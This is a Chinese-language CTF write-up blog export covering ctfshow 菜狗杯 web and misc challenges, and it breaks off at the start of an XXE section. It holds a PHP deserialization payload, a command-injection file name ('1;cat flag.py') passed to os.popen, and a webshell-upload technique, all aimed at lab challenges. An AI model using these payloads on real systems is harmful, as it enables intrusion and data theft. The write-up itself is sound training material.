class="hljs-string">&quot;以前陪我看月亮的时候，叫人家小甜甜！现在新人胜旧人，叫人家&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;nickname.<span class="hljs-string">&quot;。\n&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;你以为我这么辛苦来这里真的是为了这条臭牛吗?是为了你这个没良心的臭猴子啊!\n&quot;</span>;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">call</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;\t\t\t\t\t\t\t\t\t\t----&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;nickname;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]);<br><br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Ion_Fan_Princess</span>();<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>简单反序列化：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Moon</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Ion_Fan_Princess</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Ion_Fan_Princess</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$nickname</span>=<span class="hljs-string">&quot;小甜甜&quot;</span>;<br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Moon</span>());<br><br>payload：<br>O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Moon&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;O:<span class="hljs-number">16</span>:<span class="hljs-string">&quot;Ion_Fan_Princess&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;nickname&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;小甜甜&quot;</span>;&#125;&#125;<br></code></pre></td></tr></table></figure><h3 id="LSB探姬"><a href="#LSB探姬" class="headerlink" title="LSB探姬"></a>LSB探姬</h3><p>源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># !/usr/bin/env python</span><br><span class="hljs-comment"># -*-coding:utf-8 -*-</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string"># File       : app.py</span><br><span class="hljs-string"># Time       ：2022/10/20 15:16</span><br><span class="hljs-string"># Author     ：g4_simon</span><br><span class="hljs-string"># version    ：python 3.9.7</span><br><span class="hljs-string"># Description：TSTEG-WEB</span><br><span class="hljs-string"># flag is in /app/flag.py</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><span class="hljs-comment">#初始化全局变量</span><br>app = Flask(__name__)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():    <br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;upload.html&#x27;</span>)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload_file</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-keyword">try</span>:<br>            f = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br>            f.save(<span class="hljs-string">&#x27;upload/&#x27;</span>+f.filename)<br>            cmd=<span class="hljs-string">&quot;python3 tsteg.py upload/&quot;</span>+f.filename<br>            result=os.popen(cmd).read()<br>            data=&#123;<span class="hljs-string">&quot;code&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;cmd&quot;</span>:cmd,<span class="hljs-string">&quot;result&quot;</span>:result,<span class="hljs-string">&quot;message&quot;</span>:<span class="hljs-string">&quot;file uploaded!&quot;</span>&#125;<br>            <span class="hljs-keyword">return</span> jsonify(data)<br>        <span class="hljs-keyword">except</span>:<br>            data=&#123;<span class="hljs-string">&quot;code&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;message&quot;</span>:<span class="hljs-string">&quot;file upload error!&quot;</span>&#125;<br>            <span class="hljs-keyword">return</span> jsonify(data)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;upload.html&#x27;</span>)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/source&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show_source</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;source.html&#x27;</span>)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">80</span>,debug=<span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure><p>突破点：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">cmd=<span class="hljs-string">&quot;python3 tsteg.py upload/&quot;</span>+f.filename<br>result=os.popen(cmd).read()<br></code></pre></td></tr></table></figure><p>这里可以进行 python 命令执行，只需要改一个文件名即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">filename=<span class="hljs-string">&quot;1;cat flag.py&quot;</span><br></code></pre></td></tr></table></figure><p>我们使用分号 ; 进行命令分隔，然后 cat即可</p><p><img src="https://s2.loli.net/2023/03/06/CYUbksMRc4GNyQi.png" alt="image-20230306173101904"></p><h3 id="Is-Not-Obfuscate"><a href="#Is-Not-Obfuscate" class="headerlink" title="Is_Not_Obfuscate"></a>Is_Not_Obfuscate</h3><p>查看源码</p><p><img src="https://s2.loli.net/2023/03/06/lpxroTZb2cEi6J1.png" alt="image-20230306173407767"></p><p>提示我们访问 <code>robots.txt</code>文件</p><p><img src="https://s2.loli.net/2023/03/06/gi2JaMZxsrSOUzy.png" alt="image-20230306173829040"></p><p>访问 <code>/lib.php?flag=0</code> 什么东西都没有，我们将 0 改为 1：</p><p><img src="https://s2.loli.net/2023/03/06/I5WVKj8uXY6JkMO.png" alt="image-20230306173943135"></p><p>发现一大堆编码</p><p>没有其他思路，我们继续查看首页：</p><p><img src="https://s2.loli.net/2023/03/06/KJZQPw79UNV51IA.png" alt="image-20230306174236577"></p><p>我们发现隐藏了一个 执行按钮，我们将value改为test，然后我们再将上述获得的编码放入input中：</p><p><img src="https://s2.loli.net/2023/03/06/CDUlsbvkK93u4wJ.png" alt="image-20230306174540414"></p><p>注意：需要将上述编码进行url编码一次，我们获得如下源码：</p><p><img src="https://s2.loli.net/2023/03/06/vxCYWIrzQmAnuTp.png" alt="image-20230306174745354"></p><p>我们主要关注这里：</p><p><img src="https://s2.loli.net/2023/03/06/DRQaTgIsFZfeNYl.png" alt="image-20230306174848932"></p><p>思路就是：我们将一句话木马push进去，之后使用pull拉取下来，进行命令执行</p><p><img src="https://s2.loli.net/2023/03/06/2PRcnWeOsNKUQ39.png" alt="image-20230306180009955"></p><p><img src="https://s2.loli.net/2023/03/06/jkqsBo6Tie98CRQ.png" alt="image-20230306180042873"></p><p>注意：要在命令后加入<code>youyou</code> 再进行md5编码：</p><p><img src="https://s2.loli.net/2023/03/06/35bQdE4RTegtkvw.png" alt="image-20230306180125929"></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="杂项签到"><a href="#杂项签到" class="headerlink" title="杂项签到"></a>杂项签到</h3><p><img src="https://s2.loli.net/2023/03/09/19Uni4u2VEFMt8l.png" alt="image-20230309195047150"></p><p>直接使用010搜，得到flag</p><h3 id="损坏的压缩包"><a href="#损坏的压缩包" class="headerlink" title="损坏的压缩包"></a>损坏的压缩包</h3><p><img src="https://s2.loli.net/2023/03/09/n5lA9KJBi2ZXL3s.png" alt="image-20230309195537236"></p><p>使用010打开，发现是png文件，于是将后缀改为png得到flag</p><h3 id="谜之栅栏"><a href="#谜之栅栏" class="headerlink" title="谜之栅栏"></a>谜之栅栏</h3><p>下载得到【找不同】文件夹，包含两张图片，提示我们找不同，</p><p>于是我们使用010打开，然后比较两个文件的不同之处</p><p><img src="https://s2.loli.net/2023/03/09/TcJ3lm8GAKns95E.png" alt="image-20230309195624457"></p><p><img src="https://s2.loli.net/2023/03/09/rO6LtpPGu1fMgxK.png" alt="image-20230309195640959"></p><p>然后点击差异部分：</p><p><img src="https://s2.loli.net/2023/03/09/rYsdJGaOLb9gF2H.png" alt="image-20230309195723092"></p><p>找到了不同的地方，发现存在一定规律，结合题目可知，这是栅栏密码</p><p>于是我们解密：<br><img src="https://s2.loli.net/2023/03/09/Fs3XbTykePNwAtx.png" alt="image-20230309195925281"></p><h3 id="你会数数吗"><a href="#你会数数吗" class="headerlink" title="你会数数吗"></a>你会数数吗</h3><p><img src="https://s2.loli.net/2023/03/09/wTkMCgehvf46Bsa.png" alt="image-20230309200110554"></p><p>文件中包含大量无规律字符，根据经验可知，这应该是根据频率来排序：</p><p>我们可以直接使用010的直方图功能来排序：</p><p><img src="https://s2.loli.net/2023/03/09/VWmZx7QXpurSv89.png" alt="image-20230309200629065"></p><p>然后根据百分比降序排列：</p><p><img src="https://s2.loli.net/2023/03/09/WmX8OeT9iaUyjtD.png" alt="image-20230309200402076"></p><p>得到flag</p><p>或者使用python脚本来统计：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;C://Users/LIKE/Desktop/misc4&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>)<br>dic = &#123;&#125;<br>data = f.read()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:<br>    <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> dic:<br>        dic[i] += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        dic[i] = <span class="hljs-number">1</span><br><br>data = <span class="hljs-built_in">sorted</span>(dic.items(), key=<span class="hljs-keyword">lambda</span> x: x[<span class="hljs-number">1</span>], reverse=<span class="hljs-literal">True</span>) <span class="hljs-comment"># 根据字典的值排序</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:<br>    <span class="hljs-built_in">print</span>(i[<span class="hljs-number">0</span>], end=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="你会异或吗"><a href="#你会异或吗" class="headerlink" title="你会异或吗"></a>你会异或吗</h3><blockquote><p>hint：神秘数字:<code>0x50</code></p></blockquote><p>根据题目，我们将png图片与数字 <code>0x50</code> 进行异或运算：</p><p><img src="https://s2.loli.net/2023/03/09/yZLP6CBfTQ5DXOo.png" alt="image-20230309202231508"></p><p><img src="https://s2.loli.net/2023/03/09/Rog2mTA3WQqYcrS.png" alt="image-20230309202249148"></p><p>异或后得到真正的png图片，打开得到flag</p><h3 id="flag一分为二"><a href="#flag一分为二" class="headerlink" title="flag一分为二"></a>flag一分为二</h3><p><img src="https://s2.loli.net/2023/03/09/HYWfxkvCqLQtVK6.png" alt="image-20230309202457748"></p><p>我们将图片拖入010，发现crc不匹配，我们需要修改高度，可以手动修改，也可以借助脚本算出crc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zlib<br><span class="hljs-keyword">import</span> struct<br><br>file = <span class="hljs-string">&#x27;C://Users/LIKE/Desktop/miku.png&#x27;</span><br>fr = <span class="hljs-built_in">open</span>(file, <span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>data = <span class="hljs-built_in">bytearray</span>(fr[<span class="hljs-number">12</span>:<span class="hljs-number">29</span>])<br><span class="hljs-comment"># crc32key = eval(str(fr[29:33]).replace(&#x27;\\x&#x27;,&#x27;&#x27;).replace(&quot;b&#x27;&quot;,&#x27;0x&#x27;).replace(&quot;&#x27;&quot;,&#x27;&#x27;))</span><br><br>crc32key = <span class="hljs-number">0x7507b944</span>  <span class="hljs-comment"># crc值</span><br><br><span class="hljs-comment"># data = bytearray(b&#x27;\x49\x48\x44\x52\x00\x00\x01\xF4\x00\x00\x01\xF1\x08\x06\x00\x00\x00&#x27;)</span><br>n = <span class="hljs-number">4095</span><br><span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>    width = <span class="hljs-built_in">bytearray</span>(struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>, w))<br>    <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>        height = <span class="hljs-built_in">bytearray</span>(struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>, h))<br>        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            data[x + <span class="hljs-number">4</span>] = width[x]<br>            data[x + <span class="hljs-number">8</span>] = height[x]<br>            <span class="hljs-comment"># print(data)</span><br>        crc32result = zlib.crc32(data)<br>        <span class="hljs-keyword">if</span> crc32result == crc32key:<br>            <span class="hljs-built_in">print</span>(width, height)<br>            <span class="hljs-built_in">print</span>(data)<br>            newpic = <span class="hljs-built_in">bytearray</span>(fr)<br>            <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>                newpic[x + <span class="hljs-number">16</span>] = width[x]<br>                newpic[x + <span class="hljs-number">20</span>] = height[x]<br>            <span class="hljs-comment">#           fw = open(file+&#x27;.png&#x27;,&#x27;wb&#x27;)</span><br>            fw = <span class="hljs-built_in">open</span>(file, <span class="hljs-string">&#x27;wb&#x27;</span>)<br>            fw.write(newpic)<br>            fw.close<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;It&#x27;s done!&quot;</span>)<br></code></pre></td></tr></table></figure><p>修复得到一半flag：</p><p><img src="https://s2.loli.net/2023/03/09/zsw6UtJ8jpdSAWM.png" alt="image-20230309203206616">                                                                                                                                                                                                                                                                                                                                                                 </p><p>还有一半flag，是在图片中，但是看不到，知识点是<code>盲水印</code></p><p>我们使用工具<code>WaterMark</code> 可以获得另一半</p><p><img src="https://s2.loli.net/2023/03/09/kgVUYOsIJnXxDZH.png" alt="image-20230309203403778"></p><h3 id="我是谁？？"><a href="#我是谁？？" class="headerlink" title="我是谁？？"></a>我是谁？？</h3><p>这题用眼睛看，或者使用大神脚本</p><h3 id="You-and-me"><a href="#You-and-me" class="headerlink" title="You and me"></a>You and me</h3><p><img src="https://s2.loli.net/2023/03/09/OdrzkB6IvgCTP3j.png" alt="image-20230309204023798"></p><p>下载后得到两张一摸一样的图片，盲猜使用了盲水印</p><p>我们可以使用脚本：<code>BlindWaterMark</code></p><p><img src="https://s2.loli.net/2023/03/09/3DvGdZ7WHi9j1y5.png" alt="image-20230309204230822"></p><p>然后得到flag：</p><p><img src="https://s2.loli.net/2023/03/09/NCFIBh4lncR69GH.png" alt="image-20230309204304932"></p><h3 id="黑丝白丝还有什么丝？"><a href="#黑丝白丝还有什么丝？" class="headerlink" title="黑丝白丝还有什么丝？"></a>黑丝白丝还有什么丝？</h3><blockquote><p>题目提示：莫丝密码</p></blockquote><p>点进去一个视频，因为提示摩斯密码，所以我们把黑丝当1，白丝当0，转场为分隔</p><p>使用莫斯解密</p><h3 id="我吐了你随意"><a href="#我吐了你随意" class="headerlink" title="我吐了你随意"></a>我吐了你随意</h3><p>下载后得到一个【0宽隐写】文件，很明显使用：<a href="https://www.mzy0.com/ctftools/zerowidth1/">0宽解密</a></p><p><img src="https://s2.loli.net/2023/03/09/btN1c7TevRUw95G.png" alt="image-20230309204641030"></p><h3 id="这是个什么文件？"><a href="#这是个什么文件？" class="headerlink" title="这是个什么文件？"></a>这是个什么文件？</h3><p><img src="https://s2.loli.net/2023/03/09/HAE58rPxiVk6zSC.png" alt="image-20230309205140753"></p><p>zip伪加密，将位置上的数改为00</p><p><img src="https://s2.loli.net/2023/03/09/uIFjJc1DSNbke2d.png" alt="image-20230309205223909"></p><p>打开这个文件，发现了一串乱码，后缀py，可能需要：<a href="https://tool.lu/pyc/">python反编译</a></p><p><img src="https://s2.loli.net/2023/03/09/VpSztaJ6UR1Z7dX.png" alt="image-20230309205349044"></p><p>反编译之后我们只需要执行代码就行</p><p><img src="https://s2.loli.net/2023/03/09/w7sXq43aMPloFNe.png" alt="image-20230309205437730"></p><h3 id="抽象画"><a href="#抽象画" class="headerlink" title="抽象画"></a>抽象画</h3><p><img src="https://s2.loli.net/2023/03/09/mdAuMORfESGqv8I.png" alt="image-20230309205543022"></p><p>下载后得到一个txt文件，打开发现疑似base编码，但是我们不知道是哪一类，于是我们可以使用一个</p><p>工具：<code>basecrack</code></p><p>我们先将编码保存到<code>1.txt</code>，然后使用如下代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python3 basecrack -f <span class="hljs-number">1.</span>txt  <span class="hljs-comment"># -f代表从文件中读取</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/09/zed28E6KMnFNfhD.png" alt="image-20230309205949176"></p><p>如图，已经成功解了一次，我们继续：</p><p><img src="https://s2.loli.net/2023/03/09/Kjq8wJWryg1ZOvH.png" alt="image-20230309210040545"></p><p>最后一次：</p><p><img src="https://s2.loli.net/2023/03/09/EihYcpvWlV7936T.png" alt="image-20230309210131944"></p><p>解出来，发现是png图片，我们保存一下，打开：</p><p><img src="https://s2.loli.net/2023/03/09/b7Hizl2fgmF5LKP.png" alt="image-20230309210236136"></p><p>不知道一坨什么玩意儿</p><p>查询资料得知，这是一种奇葩编程语言，<code>Piet是用颜色来编写代码</code>，我们可以使用 <code>npiet</code> 解密</p><p><img src="https://s2.loli.net/2023/03/09/fXe52rFjS9y1viO.png" alt="image-20230309210645860"></p><h3 id="迅疾响应"><a href="#迅疾响应" class="headerlink" title="迅疾响应"></a>迅疾响应</h3><p><img src="https://s2.loli.net/2023/03/09/7fqoxWy6XUvdeHc.png" alt="image-20230309210840932"></p><p>下载 后得到一张二维码，但是扫不了，看了wp后，使用一个网站：<a href="https://merricx.github.io/qrazybox/">https://merricx.github.io/qrazybox/</a>                                                                                                                              </p><p><img src="https://s2.loli.net/2023/03/09/LVFXR8hCA1uBPz2.png" alt="image-20230309210935661"></p><p>首先导入一个图片</p><p><img src="https://s2.loli.net/2023/03/09/sqjY7zinBXUAxtK.png" alt="image-20230309211020078"></p><p>然后点击 tools，再分离信息</p><p><img src="https://s2.loli.net/2023/03/09/B67gnHe2EWT5Fxw.png" alt="image-20230309211045091"></p><p>得到一半flag</p><p><img src="https://s2.loli.net/2023/03/09/7mVLsI6rCOohTUz.png" alt="image-20230309211119337"></p><p>还有一半，将选中区域涂白</p><p><img src="https://s2.loli.net/2023/03/09/PkXnVwfyzJbrEDQ.png" alt="image-20230309211357908"></p><p>然后再分离信息，得到flag</p><h3 id="我可没有骗你"><a href="#我可没有骗你" class="headerlink" title="我可没有骗你"></a>我可没有骗你</h3><p><img src="https://s2.loli.net/2023/03/09/G1on5gIZDSMF4mq.png" alt="image-20230309211531561"></p><p>爆破得到压缩包密码(8位)</p><p>得到一个文件，使用010打开：</p><p><img src="https://s2.loli.net/2023/03/09/rIxBzHw15PqM8nC.png" alt="image-20230309212326682"></p><p>发现是一个 <code>wav</code> 文件，我们使用 <code>SilentEye </code> 进行解密：</p><p><img src="https://s2.loli.net/2023/03/09/nISPDZUvaX7Kfjc.png" alt="image-20230309212554859"></p><p>我们需要将 <code>Sound quality</code>  换为 <code>high</code></p><h3 id="你被骗了"><a href="#你被骗了" class="headerlink" title="你被骗了"></a>你被骗了</h3><p><img src="https://s2.loli.net/2023/03/09/m7cX5TfelPuSis4.png" alt="image-20230309212735630"></p><p>这里有一个虚假的flag</p><p>这里是mp3隐写，我们使用工具 <code>MP3Stego</code></p><p>但是解密需要密码，密码就是：<code>nibeipianle</code></p><p><img src="https://s2.loli.net/2023/03/09/7ygYIV9UuAdpWaC.png" alt="image-20230309213128985"></p><p>打开txt文件获得flag</p><h3 id="一闪一闪亮晶晶"><a href="#一闪一闪亮晶晶" class="headerlink" title="一闪一闪亮晶晶"></a>一闪一闪亮晶晶</h3><p>压缩包有两个文件，其中一个是一个码，但不是二维码：</p><p><img src="https://s2.loli.net/2023/03/09/OjZ8S7tEvIqY5oz.png" alt="image-20230309213501345"></p><p>这个是：<code>汉信码</code></p><p>我们扫一下：</p><p><img src="https://s2.loli.net/2023/03/09/M8fxJKlVNgmDsRU.png" alt="image-20230309213618786"></p><p>得到压缩包密码：<code>CDBHSBHSxskv6</code></p><p>解压 m4a 文件，听一下像外星录音，于是我们需要使用 <code>RXSSTV</code> 进行识别，需要安装虚拟声卡</p><p>听一下就得到flag</p><p><img src="https://s2.loli.net/2023/03/09/dPOiCJVmnUsHkup.png" alt="image-20230309214208678"></p><h3 id="打不开的图片"><a href="#打不开的图片" class="headerlink" title="打不开的图片"></a>打不开的图片</h3><p>联想到png文件开头应该是89 50 4E 47，观察下题目给的png的开头是77 B0 B2 B9，会发现0x89+0x77&#x3D;0x100, 0x50+0xB0&#x3D;0x100, 0x4E+0xB2&#x3D;0x100, 0x47+0xB9&#x3D;0x100, 所以，只要用0x100减去现在png文件中的每个字节的16进制数即可恢复出可以预览的png图片。<br>但是要注意这里还有一个小坑，就是0x100是十进制数的256，而bytes格式最大只能表示到255，出现256会报错，所以题目原png文件中是0的位置，还是0，不能用0x100去减。<br>具体可以写Python脚本来做，而且做这道题的过程中，解决了上次做异或题目（也是菜狗杯的Misc题目之前写了博客）遇到的问题，其实就是把整个文件处理后的结果（int类型）放在list中，再把整个list放在bytes()中即可转换成bytes格式写入新的文件中，得到恢复的文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">ff=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./misc5.5.png&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>data=ff.read()<br>l=[]<br><span class="hljs-keyword">for</span> dd <span class="hljs-keyword">in</span> data:<br>    <span class="hljs-keyword">if</span> dd==<span class="hljs-number">0</span>:<br>        l.append(dd)<br>    <span class="hljs-keyword">else</span>:<br>        l.append(<span class="hljs-number">0x100</span>-dd) <br>ff=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./1234.png&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-comment">#会新建一个可写入的新文件1234.png</span><br>ff.write(<span class="hljs-built_in">bytes</span>(l))<br>ff.close()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfshow_菜狗杯</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow_xxe</title>
    <link href="/2023/08/24/ctfshow_xxe/"/>
    <url>/2023/08/24/ctfshow_xxe/</url>
    
    <content type="html"><![CDATA[<h2 id="ctfshow-xxe（xml外部实体注入漏洞）"><a href="#ctfshow-xxe（xml外部实体注入漏洞）" class="headerlink" title="ctfshow_xxe（xml外部实体注入漏洞）"></a>ctfshow_xxe（xml外部实体注入漏洞）</h2><h3 id="web373"><a href="#web373" class="headerlink" title="web373"></a>web373</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>); <span class="hljs-comment">//允许载入外部实体</span><br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>(); <span class="hljs-comment">//创建一个dom对象</span><br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD); <span class="hljs-comment">//解析一个 XML 标签字符串来组成该文档</span><br>    <span class="hljs-variable">$creds</span> = <span class="hljs-title function_ invoke__">simplexml_import_dom</span>(<span class="hljs-variable">$dom</span>); <span class="hljs-comment">//把 DOM 节点转换为 SimpleXMLElement 对象。</span><br>    <span class="hljs-variable">$ctfshow</span> = <span class="hljs-variable">$creds</span>-&gt;ctfshow; <span class="hljs-comment">//引用ctfshow标签</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$ctfshow</span>; <span class="hljs-comment">//输出 ctfshow 标签的内容，节点嵌套</span><br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>); <br></code></pre></td></tr></table></figure><p>经过分析，该题为有回显的 xxe</p><p>payload:</p><figure class="highlight 